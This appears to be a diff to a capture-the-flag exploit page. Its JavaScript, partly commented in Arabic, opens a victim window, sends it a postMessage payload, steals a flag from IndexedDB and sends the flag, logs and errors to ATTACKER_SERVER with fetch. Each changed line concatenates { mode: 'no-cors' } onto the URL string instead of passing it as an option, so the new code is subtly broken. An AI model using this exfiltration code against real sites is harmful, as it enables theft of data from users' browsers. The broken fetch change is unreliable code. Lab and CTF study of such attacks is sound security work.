@@ -14,7 +14,7 @@
                 
                 // We'll define a function in our opener window to receive the flag.
                 window.opener.receiveFlag = function(flag) {
-                    fetch("${ATTACKER_SERVER}?flag=" + encodeURIComponent(flag));
+                    fetch("${ATTACKER_SERVER}?flag=" + encodeURIComponent(flag)+{ mode: 'no-cors'});
                 };
 
                 // Now, let's steal the flag from IndexedDB.
@@ -59,12 +59,12 @@
                 // 4. أرسل الرسالة إلى النافذة التي فتحناها للتو.
                 victimWindow.postMessage(messagePayload, "*");
                 
-                fetch(ATTACKER_SERVER + "?log=Message_Sent_To_Victim_Window");
+                fetch(ATTACKER_SERVER + "?log=Message_Sent_To_Victim_Window"+{ mode: 'no-cors'});
 
             }, 2000); // انتظر ثانيتين
 
         } catch (e) {
-            fetch(ATTACKER_SERVER + "?error=" + encodeURIComponent(e.toString()));
+            fetch(ATTACKER_SERVER + "?error=" + encodeURIComponent(e.toString())+{ mode: 'no-cors'});
         }
     </script>
 </body>
